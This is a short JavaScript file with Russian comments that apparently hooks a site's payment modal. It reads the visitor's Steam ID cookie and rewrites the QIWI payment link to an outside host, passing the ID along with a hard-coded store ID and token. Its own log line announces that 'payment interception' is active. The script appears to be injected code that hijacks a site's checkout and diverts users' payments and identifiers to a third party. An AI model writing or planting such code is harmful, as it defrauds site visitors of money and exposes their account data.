function paymentFormHandle() {
    setTimeout(() => {
        const steamID = getCookie('steamid');
        const paymentLink = document.getElementById('qiwi-inp-other2');

        if (steamID && paymentLink) {
            const storeID = 15212;
            const token = '5d368f7279f50abbaee5';
            const language = 'ru';

            paymentLink.href = `https://pay.moscow.ovh/?userID=${steamID}&storeID=${storeID}&token=${token}&language=${language}`;
        }
    }, 100); // Ждём 100мс чтобы модалка прогрузилась
}

// Функция получения cookie по имени
function getCookie(name) {
    const matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([.$?*|{}()\\[\\]\\/+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}

// Автолог
console.log("payment-fix.js подключен: перехват оплаты активирован ✅");
